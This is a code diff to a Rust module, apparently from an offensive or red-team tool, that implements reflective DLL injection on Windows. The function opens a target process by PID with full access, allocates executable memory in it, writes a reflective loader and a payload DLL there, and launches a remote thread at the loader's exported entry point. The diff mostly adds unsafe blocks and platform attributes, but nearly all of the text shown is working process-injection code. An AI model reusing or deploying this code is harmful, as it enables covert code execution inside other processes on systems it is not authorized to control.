@@ -78,7 +78,7 @@ const LOADER_BYTES: &[u8] = include_bytes!(concat!(
 ));
 // const LOADER_BYTES: &[u8] = include_bytes!("../../../../../bin/reflective_loader/target/x86_64-pc-windows-gnu/release/reflective_loader.dll");
 
-// #[cfg(target_os = "windows")]
+#[cfg(target_os = "windows")]
 fn get_export_address_by_name(
     pe_bytes: &[u8],
     export_name: &str,
@@ -129,6 +129,7 @@ struct UserData {
     function_offset: u64,
 }
 
+#[cfg(target_os = "windows")]
 fn handle_dll_reflect(
     target_dll_bytes: Vec<u8>,
     pid: u32,
@@ -146,76 +147,76 @@ fn handle_dll_reflect(
     // let nt_header = (reflective_loader_dll.as_ptr() as usize + (unsafe { *dos_header }).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
     let image_size = reflective_loader_dll.len();
 
-    let process_handle = open_process(PROCESS_ALL_ACCESS, 0, pid)?;
+    let process_handle = unsafe { open_process(PROCESS_ALL_ACCESS, 0, pid) }?;
 
     // Allocate and write loader to remote process
-    let remote_buffer = virtual_alloc_ex(
+    let remote_buffer = unsafe { virtual_alloc_ex(
         process_handle,
         null_mut(),
         image_size as usize,
         MEM_COMMIT | MEM_RESERVE,
         PAGE_EXECUTE_READWRITE,
-    )?;
+    ) }?;
 
-    let _loader_bytes_written = write_process_memory(
+    let _loader_bytes_written = unsafe { write_process_memory(
         process_handle,
         remote_buffer as _,
         reflective_loader_dll.as_ptr() as _,
         image_size as usize,
-    )?;
+    ) }?;
 
     // Allocate and write user data to the remote process
-    let remote_buffer_user_data: *mut std::ffi::c_void = virtual_alloc_ex(
+    let remote_buffer_user_data: *mut std::ffi::c_void = unsafe { virtual_alloc_ex(
         process_handle,
         null_mut(),
         std::mem::size_of::<UserData>(),
         MEM_COMMIT | MEM_RESERVE,
         PAGE_EXECUTE_READWRITE,
-    )?;
+    ) }?;
 
     let user_data_ptr: *const UserData = &user_data as *const UserData;
-    let _user_data_bytes_written = write_process_memory(
+    let _user_data_bytes_written = unsafe { write_process_memory(
         process_handle,
         remote_buffer_user_data as _,
         user_data_ptr as *const _,
         std::mem::size_of::<UserData>(),
-    )?;
+    ) }?;
 
     // Allocate and write function offset + payload to remote process
     let user_data_ptr_size = std::mem::size_of::<u64>();
-    let remote_buffer_target_dll: *mut std::ffi::c_void = virtual_alloc_ex(
+    let remote_buffer_target_dll: *mut std::ffi::c_void = unsafe { virtual_alloc_ex(
         process_handle,
         null_mut(),
         user_data_ptr_size + target_dll_bytes.len() as usize,
         MEM_COMMIT | MEM_RESERVE,
         PAGE_EXECUTE_READWRITE,
-    )?;
+    ) }?;
 
     // Write user data ptr to start of param.
     let user_data_ptr_as_bytes = (remote_buffer_user_data as usize).to_le_bytes(); // The address in a slice little endian. Eg. 0xff01 = [01, ff]
     let user_data_ptr_in_remote_buffer = remote_buffer_target_dll as usize;
-    let _payload_bytes_written = write_process_memory(
+    let _payload_bytes_written = unsafe { write_process_memory(
         process_handle,
         user_data_ptr_in_remote_buffer as _,
         user_data_ptr_as_bytes.as_slice().as_ptr() as *const _,
         user_data_ptr_size,
-    )?;
+    ) }?;
 
     // Write dll_bytes at buffer + size of pointer to user data (should be usize)
     let payload_ptr_in_remote_buffer = remote_buffer_target_dll as usize + user_data_ptr_size;
-    let _payload_bytes_written = write_process_memory(
+    let _payload_bytes_written = unsafe { write_process_memory(
         process_handle,
         payload_ptr_in_remote_buffer as _,
         target_dll_bytes.as_slice().as_ptr() as _,
         target_dll_bytes.len() as usize,
-    )?;
+    ) }?;
 
     // Find the loader entrypoint and hand off execution
     let loader_address_offset =
         get_export_address_by_name(reflective_loader_dll, loader_function_name, false)?;
     let loader_address = loader_address_offset + remote_buffer as usize;
 
-    let _thread_handle = create_remote_thread(
+    let _thread_handle = unsafe { create_remote_thread(
         process_handle,
         null_mut(),
         0,
@@ -223,23 +224,23 @@ fn handle_dll_reflect(
         remote_buffer_target_dll,
         0,
         null_mut(),
-    )?;
+    ) }?;
 
     Ok(())
 }
 
-// #[cfg(not(target_os = "windows"))]
-// pub fn dll_reflect(
-//     _dll_bytes: Vec<u32>,
-//     _pid: u32,
-//     _function_name: String,
-// ) -> anyhow::Result<NoneType> {
-//     Err(anyhow::anyhow!(
-//         "This OS isn't supported by the dll_reflect function.\nOnly windows systems are supported"
-//     ))
-// }
+#[cfg(not(target_os = "windows"))]
+pub fn dll_reflect(
+    _dll_bytes: Vec<u32>,
+    _pid: u32,
+    _function_name: String,
+) -> anyhow::Result<NoneType> {
+    Err(anyhow::anyhow!(
+        "This OS isn't supported by the dll_reflect function.\nOnly windows systems are supported"
+    ))
+}
 
-// #[cfg(target_os = "windows")]
+#[cfg(target_os = "windows")]
 pub fn dll_reflect(
     dll_bytes: Vec<u32>,
     pid: u32,
